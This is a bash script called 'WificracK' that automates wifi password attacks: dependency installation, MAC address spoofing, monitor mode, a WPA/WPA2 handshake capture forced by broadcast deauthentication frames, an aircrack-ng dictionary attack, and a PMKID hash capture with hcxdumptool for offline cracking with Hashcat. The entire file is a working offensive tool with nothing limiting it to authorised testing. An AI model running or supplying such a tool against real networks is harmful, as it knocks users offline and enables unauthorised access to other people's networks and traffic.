#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){

    echo -ne "\n${redColour}[!]${endColour} ${grayColour}Exiting....\n${endColour}"
    tput cnorm;airmon-ng stop $NET_MONITOR > /dev/null 2>&1
    rm -r validating.txt 2>/dev/null
    exit 1

}

function presentation(){
    echo -ne "${greenColour}\nWificracK - by j4ckris1337 \n${endColour}"
    sleep 3;clear
}


function dependencies(){

    clear; dependencies=(aircrack-ng macchanger xterm hcxdumptool hcxpcaptool)

    echo -ne "${purpleColour}[*] ${endColour}${blueColour}Checking dependencies${endColour}\n"

    sleep 2

    for program in "${dependencies[@]}"; do

        echo -ne "${grayColour}\n[*] $program ${endColour}\n"
        test -f /usr/bin/$program

        if [ "$(echo $?)" == "0" ];then

            echo -e " ${greenColour}(Installed)${endColour}"
        else

            echo -e "\n[*] Installing $program\n"
            apt-get install $program -y > /dev/null 2>&1


        fi;sleep 1

    done
    clear
}



function net_man(){

    echo -ne "\n${blueColour}[*]${endColour} ${grayColour}Set the name of your interface${endColour}\n"
    show=$(ip link show | awk '{print $2}' | xargs)

    echo -ne "\n\t${grayColour}($show)${endColour}\n"; echo -ne ">"
    read networkcard
    network_card=$(echo $networkcard| tr -d ':' | tr -d ' ')

    validating=$(iwconfig $network_card > /dev/null 2>&1 ; echo $? )
    


    if [ $validating  -ne "0" ]; then

        echo -ne "\n${redColour}[!]${endColour} ${grayColour}That's not your interface name :(${endColour}\n"; sleep 2

        net_man

    else
        echo -ne "\n${greenColour}[*]${endColour} ${grayColour}You are READY!! to continue :)${endColour}\n"; sleep 2; clear
    fi


    clear


    # Mac Changing
    echo -ne "\n${blueColour}[*]${endColour} ${grayColour} Changing your mac address (Please wait be pacient)${endColour}\n"

    ifconfig $network_card down

    macchanger -a $network_card > /dev/null 2>&1

    opthree=$(ifconfig $network_card up; echo $?)

    if [ $opthree -ne "0" ];then

        echo -ne "${redColour}[!] Mac changing has NOT been successfull :(${endColour}\n"
        sleep 2
    else

        echo -ne "\n${greenColour}[*]${endColour} ${grayColour}Mac changing has been successfull !!${endColour}\n"
        sleep 2

    fi


    # airmon-ng

    mon=$(airmon-ng start $network_card > /dev/null 2>&1 | echo $?)

    if [ $mon -ne "0" ];then

        echo -ne "\t\n${redColour}[!] Has some trouble putting your interface in monitor mode :(${endColour}\n"

    else
        echo -ne "\t\n${greenColour}[*]${endColour} ${grayColour}Monitor mode successfull :)${endColour}\n"; killall dhclient wpa_supplicant 2>/dev/null

        NET_MONITOR=$(iwconfig | grep "Monitor" | awk '{print $1}')
    fi

}



function cracking(){
    while true; do 

    echo -ne "${blueColour}[*]${endColour}${grayColour} Do you want to start cracking process with a dictionary attack [ y/n ]: ${endColour}"

    read yn
    case $yn in

        [yY] ) echo -ne "\n";
        
            break;;
            
        [nN] ) echo -ne "";
        
            exit;;

        *) echo -ne "";;

    esac
    done

    while true; do

        echo -ne "${blueColour}[*]${endColour}${grayColour} Pass the full path of the dictionay to use : ${endColour}"

        read dictionary

        dicionary_valid=$(test -f $dictionary | echo $?)

        if [ $dicionary_valid == "0" ];then

            break

        fi

    done

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Starting dictionary attack with $dictionary${endColour}\n"
    xterm -hold -e "aircrack-ng Captures/$APessid-handshake.cap -w $dictionary" &
    clear
    options
}


function handshake(){

    xterm -hold -e "airodump-ng $NET_MONITOR" &

    airodump_xterm_PID=$!

    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APessid
    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Channel: ${endColour}" && read Channel

    kill -9 $airodump_xterm_PID
    wait $airodump_xterm_PID 2>/dev/null

    xterm -hold -e "airodump-ng -c $Channel -w $APessid --essid $APessid $NET_MONITOR" &

    airodump_filter_xterm_PID=$!


    sleep 10; xterm -hold -e "aireplay-ng --deauth 5 -e $APessid -c 'FF:FF:FF:FF:FF:FF' $NET_MONITOR" &


    aireplay_xterm_PID=$!
    sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

    sleep 15; kill -9 $airodump_filter_xterm_PID
    wait $airodump_filter_xterm_PID 2>/dev/null
    clear

    ## Validating hasdshake with aircrack-ng
    aircrack_valid=$(aircrack-ng $APessid*.cap | awk '{print $5}' | tr '\n' ' ' | tr -d '(' | awk '{print $1}')
    if [ $aircrack_valid -eq "1" ]; then

        echo -ne "\n${greenColour}[*] Handshake of $APessid has been Successfully captured !!!${endColour}\n"
        mkdir Captures 2>/dev/null
        
        echo -ne "\n${blueColour}[+]${endColour}${grayColour} Capture directory has been created${endColour}\n"
        mv $APessid*.cap Captures/$APessid-handshake.cap; rm -r $APessid*

        filepath=$(find $(pwd) -name $APessid-handshake.cap 2>/dev/null)
        
        echo -ne "\n${blueColour}[*]${endColour} ${grayColour}File Path: $filepath${endColour}\n"
        sleep 7
        
        # WPA cracking aircrack + crunch
        cracking

    else
        clear
        echo -ne "\n${redColour}[!] Handshake has not been captured....${endColour}\n"
        sleep 3
        clear; options
        
    fi

    tput cnorm

}


# options

function options(){
    echo -ne "${greenColour}************************************************** wificracK - main menu **************************************************${endColour}"
    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Choose an attack \t Network Card:${endColour}${purpleColour} wlan0mon${endColour}\n"
    echo -ne "1) Handshake (WPA/WPA2 - PSK) Capture \n"
    echo -ne "2) PMKID Capture\n"
    echo -ne "3) Quit\n"

}


# PMKID attack functions
function pmkid(){

        airmon-ng stop $NET_MONITOR > /dev/null 2>&1
		clear; echo -e "${blueColour}[*]${endColour}${grayColour} Starting PMKID attack...${endColour}\n"

		systemctl stop NetworkManager.service
		systemctl stop wpa_supplicant.service
		
		sleep 2
		timeout 60 bash -c "hcxdumptool -i $network_card --enable_status=1 -o pmkidcap"
		
		echo -e "\n\n${blueColour}[*]${endColour}${grayColour} Getting Hashes .... (Please be patient)${endColour}\n"
		sleep 2
        systemctl start NetworkManager.service
        systemctl start wpa_supplicant.service
		
        hcxpcaptool -z hashes_pmkid pmkidcap > /dev/null 2>&1 ; rm pmkidcap 2>/dev/null
        clear
        test -f hashes_pmkid

        if [ $(echo $?) == "0" ];then

            echo -ne "\n${greenColour}[+]${endColour}${grayColour} Hashses Found !!!${endColour}\n"
            echo -ne "${blueColour}[*]${endColour} ${grayColour}Remember use Hashcat to crack this file: hashes_pmkid${endColour}"
            sleep 3

        else

            echo -ne "\n${redColour}[!]${endColour}${grayColour} Hashes has not been found....${endColour}\n"
            sleep 3
            clear
        fi
        options
}


function menu(){


    clear
    echo -ne "${greenColour}************************************************** wificracK - main menu **************************************************${endColour}"
    echo -ne "\n${blueColour}[*]${endColour}${grayColour} Choose an attack \t Network Card:${endColour}${purpleColour} wlan0mon${endColour}\n"
    
    PS3='>> '
    attacks=("Handshake (WPA/WPA2 - PSK) Capture" "PMKID Capture" "Quit")
    select fav in "${attacks[@]}"; do
    case $fav in
        "Handshake (WPA/WPA2 - PSK) Capture")

            handshake

            ;;

        "PMKID Capture")

            pmkid

            ;;
	    "Quit")
	        echo -ne "\n\tBye, bye :)\n"
	        
	        airmon-ng stop $NET_MONITOR > /dev/null 2>&1
	        tput cnorm; exit
	        ;;

        *) echo "[!]Invalid option $REPLY";;

        esac
    done

}

if [ $(id -u) -eq "0" ];then


    presentation
    dependencies
    net_man
    menu

else
    echo -ne "\n${redColour}[!]${endColour} ${grayColour}You need to be root to execute this program${endColour}\n"
fi
